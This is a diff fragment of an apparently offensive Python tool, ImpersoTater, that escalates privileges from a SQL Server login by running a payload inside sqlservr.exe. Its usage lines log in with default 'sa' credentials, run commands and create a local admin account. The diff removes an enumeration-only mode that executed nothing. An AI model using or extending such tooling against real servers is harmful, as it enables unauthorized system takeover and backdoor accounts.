@@ -7,9 +7,9 @@ without writing any executable to disk. The entire payload runs
 inside the sqlservr.exe process.
 
 Usage:
-  ImpersoTater.py [domain/]user[:pass]@host -c "whoami"
-  ImpersoTater.py -u sa -p Password1 -t 10.0.0.5 -c "whoami /all"
-  ImpersoTater.py ecorp/admin:Pass@10.0.0.5 -c "net user" --technique spooler
+  ImpersoTater [domain/]user[:pass]@host -c "whoami"
+  ImpersoTater -u sa -p Password1 -t 10.0.0.5 -c "whoami /all"
+  ImpersoTater -t 10.0.0.5 -u sa -p Password1 --add-user
 """
 
 import argparse
@@ -233,8 +233,6 @@ def parse_args():
     action.add_argument('--add-user', nargs='?', const='_generate_',
                         metavar='USER:PASS',
                         help='Create local admin. USER:PASS or auto-generated if omitted')
-    action.add_argument('--enum-only', action='store_true',
-                        help='Only enumerate target, do not execute')
     p.add_argument('--technique', choices=['auto', 'spooler', 'direct'],
                    default='auto', help='Privilege escalation technique (default: auto)')
     p.add_argument('--no-cleanup', action='store_true',
@@ -286,11 +284,6 @@ def main():
     print(f'[+] Connected')
 
     info = enumerate_target(sql)
-
-    if args.enum_only:
-        print('\n[*] Enumeration complete (--enum-only)')
-        sql.disconnect()
-        return
 
     if args.add_user is not None:
         cmd = build_add_user_cmd(args.add_user)
